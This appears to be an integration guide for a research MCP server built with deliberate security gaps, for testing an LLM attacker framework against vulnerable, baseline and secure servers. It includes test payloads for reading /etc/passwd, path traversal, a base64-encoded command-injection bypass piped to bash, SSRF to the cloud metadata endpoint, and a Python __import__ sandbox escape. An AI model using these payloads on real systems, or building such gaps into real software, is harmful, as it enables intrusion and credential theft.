# Baseline MCP Server - Integration Guide

## Summary

The baseline security MCP server has been successfully implemented and built. It follows MCP and Docker security best practices but has intentional subtle vulnerabilities for research purposes.

## What Was Created

### 1. Core Server Files

- **server.py** - Main MCP server with tool registry and stdio interface
- **tools/** - Tool modules with baseline security:
  - `files.py` - File operations (✅ blocks /etc/shadow, ❌ allows /etc/passwd)
  - `shell.py` - Shell execution (✅ blocks `;|&`, ❌ encoding bypasses work)
  - `http_client.py` - HTTP requests (✅ blocks file://, ❌ SSRF to 169.254.169.254)
  - `python_executor.py` - Python execution (✅ blocks imports, ❌ `__import__` bypass)

### 2. Docker Configuration

- **Dockerfile** - Implements baseline security:
  - ✅ Non-root user (mcpuser)
  - ✅ Minimal base image (python:3.11-slim)
  - ❌ /app writable (exploitable gap)
  - ❌ No seccomp/AppArmor profiles

- **docker-compose.yml** - Baseline hardening:
  - ✅ Resource limits (CPU: 1.0, Memory: 512M)
  - ✅ Capability dropping (cap_drop: ALL)
  - ✅ no-new-privileges flag
  - ❌ Full network access (cloud metadata accessible)

### 3. Agent Integration

- Updated `.env` with `MCP_SERVER_BASELINE_URL=http://localhost:8002`
- Updated `agent/config.py` to support `TARGET_SERVER=baseline`

## Current Status

✅ **Docker image built successfully**
- Image: `mcp_server_baseline-baseline-mcp-server:latest`
- Ready to run with `docker-compose up`

⚠️  **Note**: This server uses stdio (MCP standard), not HTTP/SSE

## Running the Server

### Option 1: Standalone with Docker Compose

```bash
cd mcp_server_baseline
docker-compose up
```

Server will start and communicate via stdio.

### Option 2: Test with MCP Client

Since this is a stdio-based MCP server, you can test it using the MCP CLI or LangGraph with stdio transport:

```bash
# Install mcp if needed
pip install mcp

# Test the server
cd mcp_server_baseline
python server.py
```

Then interact via stdin/stdout.

## Architecture Note

The current project uses HTTP/SSE-based MCP servers (vulnerable and secure on ports 8000/8001). The baseline server uses stdio (standard MCP), which is more typical for MCP implementations.

### Integration Options

1. **Add HTTP wrapper** - Create an HTTP/SSE wrapper around the stdio server
2. **Direct testing** - Test via stdio with MCP CLI or Python client
3. **Docker exec** - Run commands inside the container directly

## Testing the Baseline Server

### Test File Reading

```python
# Via MCP client
{
  "name": "read_file",
  "arguments": {"path": "/etc/passwd"}
}
# Expected: ✅ Works (not in blocklist - exploitable gap!)
```

### Test Path Traversal

```python
{
  "name": "read_file",
  "arguments": {"path": "../../../etc/passwd"}
}
# Expected: ✅ Works (no path traversal prevention - exploitable gap!)
```

### Test Command Injection

```python
{
  "name": "execute_command",
  "arguments": {"command": "ls; cat /etc/passwd"}
}
# Expected: ❌ Blocked (`;` character detected)

{
  "name": "execute_command",
  "arguments": {"command": "echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash"}
}
# Expected: ✅ Works (base64 encoding bypasses filter - exploitable gap!)
```

### Test SSRF to Cloud Metadata

```python
{
  "name": "http_request",
  "arguments": {
    "url": "http://169.254.169.254/latest/meta-data/",
    "method": "GET"
  }
}
# Expected: ✅ Works (no IP filtering - exploitable gap!)
```

### Test Python Sandbox Escape

```python
{
  "name": "execute_python",
  "arguments": {
    "code": "__import__('os').system('cat /etc/passwd')"
  }
}
# Expected: ✅ Works (__import__ with quotes bypasses filter - exploitable gap!)
```

## Security Comparison

| Feature | Baseline Server | Secure Server | Vulnerable Server |
|---------|-----------------|---------------|-------------------|
| **Docker user** | ✅ mcpuser | ✅ mcpuser | ❌ root |
| **Capabilities** | ✅ Dropped | ✅ Dropped | ❌ All |
| **Resource limits** | ✅ Yes | ✅ Yes | ❌ No |
| **/etc/passwd** | ❌ Readable | ✅ Blocked | ❌ Readable |
| **Path traversal** | ❌ Works | ✅ Blocked | ❌ Works |
| **Command injection** | ❌ Bypass via encoding | ✅ Blocked | ❌ No filter |
| **Cloud metadata** | ❌ Accessible | ✅ Blocked | ❌ Accessible |
| **Python exec** | ❌ Sandbox escape | ✅ Disabled | ❌ Unrestricted |

## Expected Attack Success Rate

- **Vulnerable Server**: ~80% (minimal security)
- **Baseline Server**: ~60-65% (basic security + subtle gaps)
- **Secure Server**: 0% (defense-in-depth)

## Next Steps

1. **Start the server**: `docker-compose up`
2. **Run attack tests**: Use the LLM attacker framework
3. **Compare results**: Test same 54 attack prompts against all three servers
4. **Document findings**: Generate comparison report

## Files Created

```
mcp_server_baseline/
├── server.py                  # Main MCP server
├── tools/
│   ├── __init__.py
│   ├── files.py              # File operations
│   ├── shell.py              # Shell execution
│   ├── http_client.py        # HTTP client
│   └── python_executor.py    # Python executor
├── Dockerfile                # Baseline security hardening
├── docker-compose.yml        # Resource limits & capabilities
├── requirements.txt          # mcp==1.18.0, requests
├── data/                     # Volume mount
├── PLANNING.md               # Detailed security analysis
├── README.md                 # Overview
└── INTEGRATION_GUIDE.md      # This file
```

## Educational Value

This server demonstrates:
1. **Following best practices isn't enough** - Even with MCP guidelines and Docker hardening, subtle gaps remain exploitable
2. **Real-world threats** - Cloud metadata SSRF, encoding bypasses, path traversal are common vulnerabilities
3. **Defense-in-depth importance** - Need multiple layers of validation, not just basic checks
4. **Security requires expertise** - Subtle implementation details matter

---

**Status**: ✅ Ready for testing
**Docker Image**: Built successfully
**Integration**: Agent configuration updated
